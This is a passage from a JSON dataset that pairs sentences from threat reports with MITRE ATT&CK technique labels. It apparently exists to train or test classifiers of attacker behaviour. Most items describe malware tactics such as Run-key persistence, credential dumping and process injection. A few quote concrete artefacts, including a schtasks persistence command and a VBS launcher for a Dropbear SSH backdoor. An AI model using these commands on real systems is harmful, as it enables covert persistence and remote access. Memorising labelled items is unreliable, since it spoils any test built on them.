    "text": "version of  adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After escalating privileges  calls TerminateProcess() CreateRemoteThread and other Win32 APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "creates a directory %USERPROFILE%\\AppData\\Local\\SKC\\ which is used to store collected log files.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can use CMD to execute a process.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has commands to enumerate all storage devices and to find all files that start with a particular string.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks to launch executables after a designated number of minutes have passed.(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can be executed via scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The Windows service was configured with the following options:Service Type: user mode service Service Start Type",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "An  HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "lateral movement scripts such as WMIExec.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "is capable of enumerating and manipulating files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows Crypto API to generate an AES key.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files for execution on the victims machine.(Citation: Talos Agent Tesla Oct 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can upload download and execute files on the victim.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can measure the download speed on a targeted host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect information related to a compromised host including OS version and a list of drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "scrapes memory for properly formatted payment card data.(Citation: FireEye Fin8 May 2016)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify the current username on the victim system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "stage the execution of additional plugins in memory,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enumerates directories and scans for certain files.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the Windows Registry or NTFS Extended Attributes to hide their data,",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to stop endpoint detection and response (EDR) tools on compromised systems.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "shows a HTTP POST request and its corresponding message body.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected files and other sensitive information from a compromised network.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "contains the getInfoOSX function to return the OS X version as well as the current user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "actors deleted tools and batch files from victim systems.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the user the threat actor used to RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can dump active logon session password hashes from the lsass process.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can receive and load executables from remote C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has been modified to be used as a Windows service. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files to a compromised machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "payloads download additional files from the C2 server.(Citation: Securelist Dropping Elephant)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used malicious e-mail attachments to lure victims into executing LNK files.(Citation: Malwarebytes Higaisa 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collects general system enumeration data about the infected machine and checks the OS version.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the computer architecture",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If the string is present, the malware executes the command RunDll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "sends an HTTP request that will contain the encrypted bot response.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a service on victim machines named TaskFrame to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks for persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can list files and directories with the `ls` `lsd` and `lsl` commands.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "stops specific defensive services (Windows Defender, etc)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has modified a victim's Windows Run registry to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can create a service to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers the registered user and primary owner name via WMI.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "dropped and executed on the server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim's %TEMP% directory path and version of Internet Explorer.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can delete tools from a compromised host after execution.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can upload data and files from a victim's machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the corresponding APIs in the appropriate library.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use Windows Mangement Instrumentation (WMI) calls to execute operations.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has collected the computer name and OS version from victim machines.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to get directory listings or drive information on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can identity the current process on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API to enable obfuscation including `GetLastError` and `GetTickCount`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can gather victim internal and external IPs.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "to register a scheduled task used to launch the ransomware payload.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has commands to get the current user's name and SID.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The file names may vary from one version of the malware to another",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has collected the victim host information after infection.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "download a “.VBS” file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating a .lnk shortcut to itself in the Startup folder. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network,",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has collected the victim machine's local IP address information and MAC address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can execute batch scripts to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has installed a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "execution begins from a scheduled task named `Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll` and it creates a separate scheduled task called `mstask` to run the wiper only once at 23:55:00.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "If it fails, it sets in the registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can download additional encrypted backdoors onto the victim via GIF files.(Citation: Securelist MiniDuke Feb 2013)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "contains a collection of Exfiltration modules that can access data from local files volumes and processes.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "collects the OS version computer name and serial number for the storage volume C:\\.  also runs the systeminfo command to gather system information. (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy May 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "creates a task to reboot the system one hour after infection.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can add itself to the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` and `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK` Registry keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has searched for rival malware and removes it if found.(Citation: Trend Micro TeamTNT)  has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to collect the computer name language settings the OS version CPU information disk devices and time elapsed since system start.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "If  cannot access shares using current privileges it attempts access using hard coded domain-specific credentials gathered earlier in the intrusion.(Citation: FireEye Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can create a scheduled task for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can inject into known vulnerable binaries on targeted hosts. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used implants capable of collecting the signed-in username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the attacker downloads files,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "One scheduled task (shown below) runs every 15 minutes",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can display an RTF document to the user to enable execution of  stage shellcode.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "used a file hunting plugin to collect .txt .pdf .xls or .doc files from the infected host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors used PowerShell to download multiple malware and archives from the server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "watch/?   search/?  find/?    results/? open/?    search/?  close/?   The “ai” value stands for the payload title",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "C&C traffic of the PUBLOAD HTTP variant",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download to and from a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the malware creates a scheduled task to execute its copy from this randomized path:\n\nschtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR \"explorer.exe c:\\users\\public\\8NaZrCq3pGeDRXKF.zip\\8NaZr.exe\" /f",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "used a script to gather the IP address of the infected machine before sending to the C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "enumerates the IP address network proxy settings and domain name from a victim's system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The  C2 channel uses HTTP POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "dispatcher can inject itself into running processes to gain higher privileges and to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "\"w.bat\" as viewed through the bash command \"cat\":",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uploads and downloads information.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads the payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "execute the command systeminfo on the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "sent username computer name and the previously generated UUID in reply to a who command from C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Use of PowerShell to download additional tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "removes itself after execution and can delete files on the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "it proceeds with scheduled task creation",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate drives and their types. It can also change file permissions using cacls.exe.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "uses the API call ShellExecuteW for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to check running processes on a targeted system.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to remove files and folders related to previous infections.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the users on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute additional payloads via a DropBox API.(Citation: Cybereason Molerats Dec 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can initiate communication over HTTP/HTTPS for its C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover information about the compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading files from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use `VirtualAlloc` `WriteProcessMemory` and then `CreateRemoteThread` to execute shellcode within the address space of `Notepad.exe`.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Its main purpose is to download and execute a second stage malware payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used wmic.exe to set environment variables.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Besides the use of Mimikatz to dump credentials,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP to communicate with a single hard-coded C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Finally, the first DLL adds the registry key “SysRat,” at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.(Citation: Talos PoetRAT April 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "from API call GetSystemTimeAsFileTime",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "performs operating system information discovery using systeminfo and has used implants to identify the system language and computer name.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC Group APT15 Alive and Strong)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected date in a .tmp file.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can load a DLL using Rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has modified the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute from autocheck autochk * to autocheck autoche * in order to execute its payload during Windows startup.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the API `DnsQuery_A` for DNS resolution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can set persistence with a Registry run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The  payload has been injected into benign Microsoft executables via process hollowing.(Citation: FireEye NETWIRE March 2019)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "contains a command to collect the victim PC name disk drive information and operating system.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used the startup folder for persistence.(Citation: Securelist Machete Aug 2014)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a delivered trojan to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used the `query user` and `whoami` commands as part of their advanced reconnaissance.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can execute PE files in the address space of the specified process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used multiple Windows APIs including HttpInitialize HttpCreateHttpHandle and HttpAddUrl.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the OS version and hostname of a targeted machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor leveraged different credentials for each step while moving laterally through the victim’s network",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "collects the network adapter information and domain/username information based on current remote sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "to search for sensitive information for exfiltration purposes.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "is injected into notepad.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used `tasklist` to collect a list of running processes on an infected system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "components use registry keys to signal each other.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "used a modified version of  along with a PowerShell-based  to dump credentials on the victim machines.(Citation: Cybereason Soft Cell June 2019)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has searched for folders associated with antivirus software.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "enables the Remote Desktop Protocol for persistence.(Citation: aptsim)  has also interacted with compromised systems to browse and copy files through RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has communicated with its C2 via HTTP POST requests.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Recorded Future REDDELTA July 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to automatically log out of created accounts every 8 hours as well as to execute malicious files.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "malware has used HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has added the registry value ntdll to the Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has been spread through Word documents containing malicious macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "threat actors using Mimikatz in conjunction with coin miner protocols and software.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "using the username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has been observed creating new services to maintain persistence. (Citation: US-CERT Emotet Jul 2018) ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has a function to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "from a process that was injected with Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has run the xp_cmdshell command in MS-SQL. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the standard Windows command line tool cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can record the hostname and kernel version of the target machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "to store and retrieve binary data with\nthe Windows API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\\WINDOWS\\TEMP\\Dropbear\\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows task XML file",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list the directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use the Windows user name to create a unique identification for infected users and systems.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "is capable of running commands to obtain a list of files and directories as well as enumerating logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PE reflective injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "s can download and upload a file to the victims computer.(Citation: Securelist Dtrack)",
    "command": "",
